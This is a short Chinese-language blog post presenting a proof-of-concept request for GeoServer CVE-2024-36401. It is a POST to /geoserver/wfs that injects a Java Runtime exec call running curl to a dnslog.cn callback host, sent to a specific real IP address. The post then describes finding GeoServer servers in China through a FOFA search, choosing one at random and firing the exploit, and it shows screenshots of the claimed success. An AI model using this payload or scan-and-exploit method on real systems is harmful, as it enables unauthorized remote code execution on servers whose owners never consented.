# CVE-2024-36401

<br>

### 挖到了人生第一个洞,记一下过程

<br>

### poc展示

````

POST /geoserver/wfs HTTP/1.1
Host: 124.221.193.109:9090
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
X-Forwarded-For: 123.123.123.123
Content-Length: 355

<wfs:GetPropertyValue service='WFS' version='2.0.0'
xmlns:topp='http://www.openplans.org/topp'
xmlns:fes='http://www.opengis.net/fes/2.0'
xmlns:wfs='http://www.opengis.net/wfs/2.0'>
<wfs:Query typeNames='sf:archsites'/>
<wfs:valueReference>
	exec(java.lang.Runtime.getRuntime(),'curl 5uzglt.dnslog.cn') </wfs:valueReference>
</wfs:GetPropertyValue>

````

<br>

## 过程

去fofa上搜索相关资产

````
app="GeoServer" && country="CN"
````
然后随便找一个网址，直接上POC即可

<img src="https://54huarui.github.io/blogs/geo/2.png" width="880" height="480">

<br>

成功图示


<img src="https://54huarui.github.io/blogs/geo/1.png" width="880" height="480">

网上很多文章的POC都是错的，这里应该以这个为准